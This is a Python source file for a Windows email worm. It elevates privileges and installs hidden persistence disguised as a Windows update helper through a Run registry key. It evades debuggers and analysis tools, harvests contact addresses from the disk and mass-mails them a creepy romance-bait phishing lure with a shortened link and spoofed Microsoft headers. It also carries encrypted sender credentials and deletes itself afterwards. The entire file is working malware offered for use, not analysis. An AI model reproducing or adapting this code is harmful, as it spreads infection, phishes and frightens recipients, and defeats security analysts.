import os
import sys
import time
import random
import smtplib
import ssl
import ctypes
import tempfile
import winreg
import shutil
import psutil
import threading
from datetime import datetime
from email.message import EmailMessage
from cryptography.fernet import Fernet, InvalidToken

# Import the compiled C++ extension module
import core

# ================ ENCRYPTED CONFIG SECTION ================ #
CONFIG_KEY = b'vdbHZheMYvg2owjhUxEgkW-L1kAtPJrouVYf9CjrTiQ='  # Replace with actual valid key

def decrypt_config():
    """Decrypt configuration at runtime using Fernet"""
    base_config = {
        'EMAIL_SENDER': 'gAAAAABoXHC-_9dAuXiMkTqWjm0J4SR1pAMVULGlbPEG4teTYf0hKIZqmXqPakN4CV66WbCyzk81NKtodYJMOQxBSNzsPTKPNQJs0z3BUebIiD-4UDEX59c=',
        'APP_PASSWORD': 'gAAAAABoXHC-teVLcWnb_8bc2gUWlU7__E4xujIX-865NNgeD7EElWRrkmN9GqhAOm3nETqppxuZyiu_81vvwevE_sqymYeUwAWMe8Llk8D4oafOGBG2nLA=',
        'LINK': 'http://bit.ly/3HSsTgn',  # Added link
        'SUBJECT': "I'm Crazy About You!! I won't Give Up On Us..",
        'BODY': "I miss being part of you. I miss the moments we spent together. See, Ive being following you for a while now,\n"
                "I even know where you work. You always said I didnt see you fully but as\n"
                "I was taking these pictures, I saw the joy in your laugh, the brightness in your smile.\n"
                "I hope the pictures bring you the same warmth they do in me. I've shared the pictures here: {link}\n"
                "I love you and you know it. Don't make me regret this please.\n"
                "I miss you, I want you back baby. Talk to me when you're free.\n\n"
                "Password = MyLove",
        'CONTACTS_DIR': r'C:\\',
        'CONTACT_EXTENSIONS': ['.vcf', '.csv', '.txt', '.contact'],
        'SMTP_SERVERS': [
            'smtp.gmail.com:465', 
            'smtp.mail.yahoo.com:587',
            'smtp.office365.com:587'
        ],
        'DELAY_BETWEEN_FILES': 0.05,
        'INITIAL_DELAY': 0.5  # Reduced from 5 seconds
    }
    
    try:
        fernet = Fernet(CONFIG_KEY)
        decrypted_config = base_config.copy()
        decrypted_config['EMAIL_SENDER'] = fernet.decrypt(
            base_config['EMAIL_SENDER'].encode()
        ).decode()
        decrypted_config['APP_PASSWORD'] = fernet.decrypt(
            base_config['APP_PASSWORD'].encode()
        ).decode()
        return decrypted_config
    except (InvalidToken, ValueError, TypeError) as e:
        print(f"[WARNING] Decryption failed: {e}. Using placeholder configuration.")
        return base_config
# ========================================================== #

# Global configuration
config = decrypt_config()

def is_admin():
    """Check for admin privileges on Windows"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def ensure_admin():
    """Elevate to admin privileges if not already"""
    if not is_admin() and os.name == 'nt':
        try:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            sys.exit(0)
        except Exception as e:
            print(f"Admin elevation failed: {e}")
    return is_admin()

def install_persistence():
    """Install persistence with retry logic and proper permissions"""
    try:
        appdata_dir = os.getenv('APPDATA')
        hidden_dir = os.path.join(appdata_dir, "Microsoft_Helper")
        
        # Create directory with retries
        for attempt in range(3):
            try:
                os.makedirs(hidden_dir, exist_ok=True)
                break
            except PermissionError:
                time.sleep(0.5)
        
        hidden_exe = os.path.join(hidden_dir, "WindowsUpdateHelper.exe")
        
        # Copy executable with retries
        for attempt in range(3):
            try:
                if not os.path.exists(hidden_exe) or os.path.getsize(hidden_exe) != os.path.getsize(sys.executable):
                    shutil.copy2(sys.executable, hidden_exe)
                break
            except PermissionError:
                time.sleep(0.5)
        
        # Set hidden attributes
        try:
            ctypes.windll.kernel32.SetFileAttributesW(hidden_dir, 2)
            ctypes.windll.kernel32.SetFileAttributesW(hidden_exe, 2)
        except:
            pass
        
        # Create registry entry with proper permissions
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_WRITE | winreg.KEY_WOW64_64KEY
            )
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, hidden_exe)
            winreg.CloseKey(key)
            return True
        except Exception as e:
            print(f"Registry error: {e}")
            return False
            
    except Exception as e:
        print(f"Persistence installation failed: {e}")
        return False

def get_smtp_server(email_sender):
    """Select SMTP server based on sender email domain"""
    domain = email_sender.split('@')[-1].lower()
    
    if 'gmail' in domain:
        return 'smtp.gmail.com:465'
    elif 'yahoo' in domain:
        return 'smtp.mail.yahoo.com:587'
    elif 'outlook' in domain or 'hotmail' in domain or 'office365' in domain:
        return 'smtp.office365.com:587'
    else:
        return random.choice(config['SMTP_SERVERS'])

def test_email_credentials():
    """Verify email credentials before sending any messages"""
    server_info = get_smtp_server(config['EMAIL_SENDER'])
    server, port = server_info.split(':')
    port = int(port)
    
    try:
        context = ssl.create_default_context()
        if port == 465:
            with smtplib.SMTP_SSL(server, port, context=context, timeout=15) as smtp:
                smtp.login(config['EMAIL_SENDER'], config['APP_PASSWORD'])
                return True
        else:
            with smtplib.SMTP(server, port, timeout=15) as smtp:
                smtp.ehlo()
                smtp.starttls(context=context)
                smtp.ehlo()
                smtp.login(config['EMAIL_SENDER'], config['APP_PASSWORD'])
                return True
    except Exception as e:
        print(f"CRITICAL: Email credential test failed: {e}")
        return False

def anti_analysis():
    """Optimized anti-analysis checks"""
    if not core.anti_analysis_check():
        return False
    
    try:
        # Faster time anomaly detection
        start = time.perf_counter()
        time.sleep(random.uniform(0.01, 0.05))
        elapsed = time.perf_counter() - start
        if elapsed < 0.005:  # More sensitive threshold
            return False
            
        # Check for analysis tools
        analysis_tools = {
            "wireshark", "fiddler", "procmon", "processhacker", 
            "ollydbg", "x64dbg", "ida", "regedit", "procexp"
        }
        for proc in psutil.process_iter(['name']):
            if any(tool in proc.info['name'].lower() for tool in analysis_tools):
                return False
                
        return True
    except:
        return False

def random_delay(min_seconds=0.01, max_seconds=0.1):
    """Minimal random delay"""
    time.sleep(random.uniform(min_seconds, max_seconds))

def scan_contacts():
    if not anti_analysis():
        return set()
    
    try:
        return core.scan_contacts(
            config['CONTACT_EXTENSIONS'],
            config['DELAY_BETWEEN_FILES']
        )
    except Exception as e:
        print(f"Scanning failed: {e}")
        return set()

def prepare_email(recipient):
    """Create email message with link instead of attachment"""
    msg = EmailMessage()
    msg['Subject'] = config['SUBJECT']
    msg['From'] = config['EMAIL_SENDER']
    msg['To'] = recipient
    msg['Date'] = datetime.now().strftime("%a, %d %b %Y %H:%M:%S -0000")
    msg['X-Mailer'] = 'Microsoft Outlook 16.0'
    msg['Message-ID'] = f'<{os.urandom(16).hex()}@microsoft.com>'
    
    # Format body with the link
    body = config['BODY'].format(link=config['LINK'])
    msg.set_content(body)
    
    return msg

def send_email(recipient):
    """Send email with domain-specific server selection"""
    if not anti_analysis():
        return False
    
    msg = prepare_email(recipient)
    if not msg:
        return False
    
    # Get domain-specific SMTP server
    server_info = get_smtp_server(config['EMAIL_SENDER'])
    server, port = server_info.split(':')
    port = int(port)
    
    try:
        context = ssl.create_default_context()
        
        if port == 465:
            with smtplib.SMTP_SSL(server, port, context=context, timeout=15) as smtp:
                smtp.login(config['EMAIL_SENDER'], config['APP_PASSWORD'])
                smtp.send_message(msg)
        else:
            with smtplib.SMTP(server, port, timeout=15) as smtp:
                smtp.ehlo()
                smtp.starttls(context=context)
                smtp.ehlo()
                smtp.login(config['EMAIL_SENDER'], config['APP_PASSWORD'])
                smtp.send_message(msg)
                
        if random.random() > 0.7:
            print(f"Message sent to {recipient}")
        return True
        
    except smtplib.SMTPException as e:
        print(f"SMTP error for {recipient}: {e}")
    except ssl.SSLError as e:
        print(f"SSL error for {recipient}: {e}")
    except Exception as e:
        print(f"General error for {recipient}: {e}")
        
    return False

def staggered_email_sender(emails):
    """Send emails with minimal delays and retries"""
    if not emails or not anti_analysis():
        return
    
    random.shuffle(emails)
    
    for email in emails:
        if not anti_analysis():
            print("Anti-analysis check failed during sending")
            return
            
        # Small initial delay
        time.sleep(random.uniform(0.05, 0.2))
        
        # Send with retries
        for attempt in range(3):
            if send_email(email):
                break
            if attempt < 2:  # Don't delay after last attempt
                time.sleep(random.uniform(1, 3))
        else:
            print(f"Failed to send to {email} after 3 attempts")

def self_clean():
    """Self-remove if running from temporary location"""
    try:
        if sys.argv[0].lower().startswith(tempfile.gettempdir().lower()):
            time.sleep(60)
            os.remove(sys.argv[0])
            print("Self-clean completed")
    except:
        pass

def main():
    """Optimized main workflow"""
    if not anti_analysis():
        print("Anti-analysis check failed at startup")
        return
    
    ensure_admin()
    install_persistence()
    
    # Reduced initial delay
    time.sleep(config['INITIAL_DELAY'])
    
    # Pre-flight credential check
    if not test_email_credentials():
        print("FATAL: Email credentials invalid. Aborting.")
        return
    
    print("Starting system scan...")
    emails = scan_contacts()
    print(f"Found {len(emails)} email addresses")
    
    if emails:
        staggered_email_sender(list(emails))
    
    self_clean()

if __name__ == '__main__':
    if os.name != 'nt':
        print("This application requires Windows")
        sys.exit(1)
    
    # Start in background thread
    threading.Thread(target=main, daemon=True).start()
    
    try:
        # Keep main thread alive
        while True:
            time.sleep(3600)
    except KeyboardInterrupt:
        sys.exit(0)